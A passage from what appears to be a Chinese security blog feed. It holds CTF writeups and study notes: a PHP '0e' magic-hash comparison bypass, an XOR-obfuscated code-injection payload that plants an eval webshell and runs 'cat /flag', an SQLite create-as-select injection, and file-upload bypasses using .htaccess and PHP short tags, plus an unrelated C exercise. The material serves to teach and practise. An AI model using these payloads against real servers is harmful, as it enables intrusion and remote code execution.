class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中几个函数的作用</p><ul><li>gen_secured_random()</li></ul><p>虽然不知道<code>$a ^= $b ^= $a ^= $b</code>的结果会是怎么样的，但$a+$b的值的长度都是六位数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1337</span><span class="token punctuation">,</span><span class="token number">2600</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">42</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1879</span><span class="token punctuation">,</span><span class="token number">1955</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">42</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token variable">$b</span> <span class="token operator">?</span> <span class="token variable">$a</span> <span class="token operator">^=</span> <span class="token variable">$b</span> <span class="token operator">^=</span> <span class="token variable">$a</span> <span class="token operator">^=</span> <span class="token variable">$b</span> <span class="token punctuation">:</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"不是6位数"</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"i = "</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>i = 100</p></blockquote><ul><li>sanitize_user_input($input)</li></ul><p>对传进来的$input进行过滤，将不是26个字母和数字的字符替换为空</p><ul><li>secured_hash_function($plain)</li></ul><p>调用sanitize_user_input()函数，对传进来的$plain进行过滤，返回过滤后的md5值</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">sanitize_user_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$h</span> <span class="token operator">=</span> <span class="token function">secured_hash_function</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">gen_secured_random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$h</span> <span class="token operator">!=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token operator">.</span><span class="token variable">$r</span> <span class="token operator">==</span> <span class="token variable">$h</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token string double-quoted-string">"Well done! Here is your flag: "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对传进来的$s，过滤掉其它字符，剩下字母和数字</p><p>$h也过滤掉后进行md5加密</p><p>$r为一个6位数的数</p><p>如果$s和$h都不等于false 以及 $s拼接上$r后如果和$h相等的话，就可以得到flag</p><br><p>这里的<code>==</code>存在弱类型比较问题</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0e123456789"</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bool(true)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0e123456789"</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bool(false)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>已知用md5加密<code>s878926199a</code>后的结果是以0e开头的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s878926199a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0e545993274517709034328855841020</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以$h=s878926199a，md5加密后为32位，减去$r的6位后，也就是说$s是以0e开头的26位数</p><p>可以是$s=0e111111111111111111111111</p><p>即<code>s=0e111111111111111111111111&amp;h=s878926199a</code></p><p>当然可以是这样的</p><p><code>s=0e&amp;h=s878926199a</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道ACM测试赛的题目</title>
      <link href="posts/20201029.html"/>
      <url>posts/20201029.html</url>
      
        <content type="html"><![CDATA[<p>一篇划水文章</p><span id="more"></span><h2 id="查找缺失的元素"><a href="#查找缺失的元素" class="headerlink" title="查找缺失的元素"></a>查找缺失的元素</h2><p>描述：给定一个数组，找出其中的最大值n，输出[0,n]在该数组中缺失的元素。</p><p>输入：输入任意个自然数，当输入为-1时，结束输入。</p><p>输出：输出缺失的元素，每两个元素之间用空格分隔。</p><br><p>例1：</p><p>输入：0 1 4 -1</p><p>输出：2 3</p><p>例2：</p><p>输入：5 8 -1</p><p>输出：0 1 2 3 4 6 7</p><br><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>① 输入数字，直到输入-1则停止输入</p><p>② 找到数组中的最大值</p><p>③ 输出[0,n]在该数组中缺失的元素</p><br><h3 id="①-输入数字，直到输入-1则停止输入"><a href="#①-输入数字，直到输入-1则停止输入" class="headerlink" title="① 输入数字，直到输入-1则停止输入"></a>① 输入数字，直到输入-1则停止输入</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>a<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="②-找到数组中的最大值"><a href="#②-找到数组中的最大值" class="headerlink" title="② 找到数组中的最大值"></a>② 找到数组中的最大值</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>a<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> max <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> j<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> max<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>max <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="③-输出-0-n-在该数组中缺失的元素"><a href="#③-输出-0-n-在该数组中缺失的元素" class="headerlink" title="③ 输出[0,n]在该数组中缺失的元素"></a>③ 输出[0,n]在该数组中缺失的元素</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>a<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> j<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> max<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>max <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> tag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> k<span class="token operator">&lt;</span>max<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>k <span class="token operator">==</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>tag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>k <span class="token operator">!=</span> max<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>tag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020全国工业互联网安全技术技能大赛 writeup</title>
      <link href="posts/20201024.html"/>
      <url>posts/20201024.html</url>
      
        <content type="html"><![CDATA[<p>签个到</p><span id="more"></span><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>拼图，拼完就可以得到flag</p><p><img src="https://s1.ax1x.com/2020/10/24/BZ3GXn.png"></p><ul><li>flag</li></ul><pre class="line-numbers language-none"><code class="language-none">flag&#123;welcome_to_chinaiisc2020&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h2 id="SimpleCalculator"><a href="#SimpleCalculator" class="headerlink" title="SimpleCalculator"></a>SimpleCalculator</h2><p>不知道怎么用这个计算器来计算，查看网页源码，尝试用 <strong>?search</strong> 传参</p><p><img src="https://s1.ax1x.com/2020/10/24/BZwcxf.png"></p><p><img src="https://s1.ax1x.com/2020/10/24/BZwoin.png"></p><p>尝试使用异或绕过</p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%ff%ff%ff%ff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%a0%b8%ba%ab'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">^</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//输出_GET</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><ul><li>构造phpinfo()</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">^</span><span class="token operator">%</span>a0<span class="token operator">%</span>b8<span class="token operator">%</span>ba<span class="token operator">%</span>ab<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>phpinfo<span class="token comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/10/24/BZ0FsO.png"></p><ul><li>构造webshell</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">%</span>ff<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">%</span>a0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>assert<span class="token operator">&amp;</span><span class="token operator">%</span>a0<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">27</span>cmd<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">//$&#123;_GET&#125;[assert]($&#123;_GET&#125;[eval($_POST[%27cmd%27])]);</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用蚁剑查看</p><blockquote><p><code>http://eci-2ze7n0wiyptutv9upaxm.cloudeci1.ichunqiu.com/flag.php?search=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27])</code></p></blockquote><p><img src="https://s1.ax1x.com/2020/10/25/BeJGrj.png"></p><p>在网站根目录下找到flag</p><ul><li>flag</li></ul><pre class="line-numbers language-none"><code class="language-none">flag&#123;08768680-a69a-42f1-b515-4220cf7e9a0d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其它方法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>search<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>a0<span class="token operator">%</span>b8<span class="token operator">%</span>ba<span class="token operator">%</span>ab<span class="token operator">^</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>a0<span class="token operator">%</span>b8<span class="token operator">%</span>ba<span class="token operator">%</span>ab<span class="token operator">^</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>a0<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token operator">%</span>a0<span class="token operator">=</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag<span class="token comment">//?search=$&#123;_GET&#125;&#123;system&#125;($&#123;_GET&#125;&#123;cat /flag&#125;);</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/10/25/BeJ0RU.png"></p><br><h2 id="SQLManager"><a href="#SQLManager" class="headerlink" title="SQLManager"></a>SQLManager</h2><p>参考文章：<a href="https://www.anquanke.com/post/id/200927#h3-6">https://www.anquanke.com/post/id/200927#h3-6</a></p><p>题目说这是个<strong>简易的SQLite管理器。</strong></p><p>而SQLite管理器有一个自动创建的库<code>sqlite_master</code>，里面保存了所有表名以及创建表时的create语句。在创建表时可以用<code>as</code>来复制另一个表中的数据，所以我们可以从中获取到flag的表名和字段名。</p><p>在建表界面用burp suite抓包，重放包得到flag的表名和字段名</p><p><img src="https://s1.ax1x.com/2020/10/24/BZGcFK.png"></p><p><strong><code>table_name=a as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=INTEGER</code></strong></p><p><img src="https://s1.ax1x.com/2020/10/24/BZJ49U.png"></p><p><img src="https://s1.ax1x.com/2020/10/24/BZJv9O.png"></p><p>这里可以得知flag所在的表：<strong>flag_Y0U_c4nt_GUESS</strong>，以及所在的字段：<strong>flag_ThE_C0lumn</strong></p><p>删表后再次抓包，表名为 <code>b</code> ，继续用burp suite重放包</p><p>将<strong>a</strong>改为<strong>b</strong>，<strong>sql</strong>改为<strong>flag_Y0U_c4nt_GUESS</strong>，将<strong>sqlite_master</strong>改为<strong>flag_ThE_C0lumn</strong></p><p><strong><code>table_name=b as select [flag_ThE_C0lumn] as[&amp;columns[0][name]=]from flag_Y0U_c4nt_GUESS;&amp;columns[0][type]=INTEGER</code></strong></p><p><img src="https://s1.ax1x.com/2020/10/24/BZtflF.png"></p><ul><li>flag</li></ul><pre class="line-numbers language-none"><code class="language-none">flag&#123;486756b1-d23c-4236-b44c-cd43640098c6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="posts/20201017.html"/>
      <url>posts/20201017.html</url>
      
        <content type="html"><![CDATA[<p>php文件上传漏洞学习笔记</p><span id="more"></span><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p><p>通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</p><blockquote><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><p>这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><br><h3 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h3><blockquote><p>.htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。</p></blockquote><p>当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。</p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>.htaccess文件配置信息,这里将后缀为.aaa的文件均解析为php文件</p></blockquote><br><h3 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h3><p>假设<code>&lt;?php</code> 被被过滤，同时PHP版本为5可以使用段标签绕过。</p><ul><li>JS风格</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>短标签风格</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</p></blockquote><ul><li>ASP风格</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>官方默认风格</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="特殊编码绕过-UTF-7"><a href="#特殊编码绕过-UTF-7" class="headerlink" 